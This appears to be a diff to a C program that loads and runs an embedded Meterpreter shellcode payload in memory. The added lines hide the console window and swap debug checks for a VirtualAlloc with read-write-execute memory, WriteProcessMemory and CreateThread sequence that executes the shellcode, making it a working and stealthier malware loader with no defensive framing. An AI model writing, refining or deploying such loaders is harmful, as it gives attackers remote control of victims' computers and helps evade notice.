@@ -3,6 +3,7 @@
 #include <stdlib.h>
 
 void main(void) {
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	unsigned char meterpreter[] =
 		"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
 		"\x8b\x52\x0c\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28"
@@ -28,33 +29,12 @@ void main(void) {
 		"\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
 		"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb"
 		"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
-
 	int meterpreterSize = 354;
 
-	//void *meterpreterMemory = VirtualAlloc(0, meterpreterSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	LPVOID addr = VirtualAllocEx(GetCurrentProcess(), NULL, 354, MEM_COMMIT, PAGE_EXECUTE_READ);
-	// memcpy(meterpreter, meterpreterMemory, meterpreterSize);
-	BOOL success = WriteProcessMemory(GetCurrentProcess(), addr, (PVOID)meterpreter, (SIZE_T)meterpreterSize, NULL);
-	if (success == 0) {
-		printf("BAD");
+	void *meterpreterMem = VirtualAlloc(0, meterpreterSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	WriteProcessMemory(GetCurrentProcess(), meterpreterMem, (PVOID)meterpreter, (SIZE_T)meterpreterSize, NULL);
+	HANDLE thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)meterpreterMem, 0, 0, 0);
+	if (thread != NULL) {
+		WaitForSingleObject(thread, -1);
 	}
-	else {
-		printf("GOOD");
-	}
-
-	//HANDLE thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)meterpreterMemory, 0, 0, 0);
-	HANDLE thread = CreateRemoteThread(GetCurrentProcess(), NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, NULL, NULL);
-
-	if (thread == NULL) {
-		printf("BAD");
-	}
-	else {
-		printf("GOOD");
-	}
-
-
-	//WaitForSingleObject(thread, -1);
-
-	//printf("%p", meterpreterMemory);
-	getchar();
 }
